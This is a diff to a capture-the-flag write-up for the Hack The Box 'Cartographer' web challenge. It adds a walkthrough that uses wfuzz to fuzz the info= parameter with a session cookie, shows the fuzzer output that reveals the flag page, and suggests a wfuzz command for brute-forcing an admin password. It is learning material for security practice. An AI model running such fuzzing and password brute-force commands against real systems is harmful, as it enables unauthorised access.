@@ -234,6 +234,9 @@ Nice.. that IS a very nice password.
 Using our newly found password, we are able to get past the login page and are
 presented with a `Cartographer Is Still Under Construction!` page.
 
+```
+http://88.198.233.174:35130/panel.php?info=home
+```
 <img src="https://github.com/fortyfunbobby/security-projects/blob/master/hackthebox/web/cartographer/login-success.jpg" width=200px/>
 
 Analyzing the server communication with Burpsuite, we see a cookie gets set
@@ -256,10 +259,11 @@ Upgrade-Insecure-Requests: 1
 
 Tried to see if the PHPSESSID value had any meaning, but didn't get any where..
 
-### FUZZING
+### WFUZZ
 
-Messing around with the `info=` parameter to `panel.php` might hold some
-promise..
+Observing that after successful login we land at a page that has `panel.php`
+with parameter `info` and the value `home`.. we can try inputing random values
+to see what happens.
 
 ```
 http://88.198.233.174:35130/panel.php?info=foo
@@ -267,8 +271,42 @@ http://88.198.233.174:35130/panel.php?info=foo
 
 <img src="https://github.com/fortyfunbobby/security-projects/blob/master/hackthebox/web/cartographer/login-nofound.jpg" width=200px/>
 
-By shear dumb ass luck, I tried a few different values and eventually tried
-`info=flag` and got something..
+Interesting, we get a `Not Found` page.. perhaps we can try to find some value
+which results in a valid page?
+
+Let's use wfuzz to iterate through different values for `info=` (need to ensure
+we pass in the `PHPSESSID` cookie as a header that got us past the login
+screen). We'll use the pattern "Not" from "Not Found" to filter out invalid
+values.
+
+```
+$ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hs Not -H "Cookie:PHPSESSID=goa9r4gatjedo6df8uktgpclp7" http://88.198.233.174:35130/panel.php?info=FUZZ
+```
+
+```
+********************************************************
+* Wfuzz 2.2.3 - The Web Fuzzer                         *
+********************************************************
+
+Target: HTTP://88.198.233.174:35130/panel.php?info=FUZZ
+Total requests: 45463
+
+==================================================================
+ID	Response   Lines      Word         Chars          Payload    
+==================================================================
+
+16817:  C=200     16 L	      28 W	    384 Ch	  "flag"
+20310:  C=200     16 L	      30 W	    408 Ch	  "home"
+
+Total time: 751.5835
+Processed Requests: 45463
+Filtered Requests: 45461
+Requests/sec.: 60.48961
+
+```
+
+So fuzzing yields two valid values for the `info=` parameter, 1. `home` (which
+we already know of) and `flag`!!
 
 ```
 http://88.198.233.174:35130/panel.php?info=flag
@@ -276,4 +314,9 @@ http://88.198.233.174:35130/panel.php?info=flag
 
 <img src="https://github.com/fortyfunbobby/security-projects/blob/master/hackthebox/web/cartographer/login-flag.jpg" width=200px/>
 
-Would be good to figure out how to solve this using tools instead of luck..
+Would be interesting to try and brute force other POST request challenges in
+the future with something like this..
+
+```
+$ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 -d "username=admin&password=FUZZ" http://88.198.233.174:35130/
+```
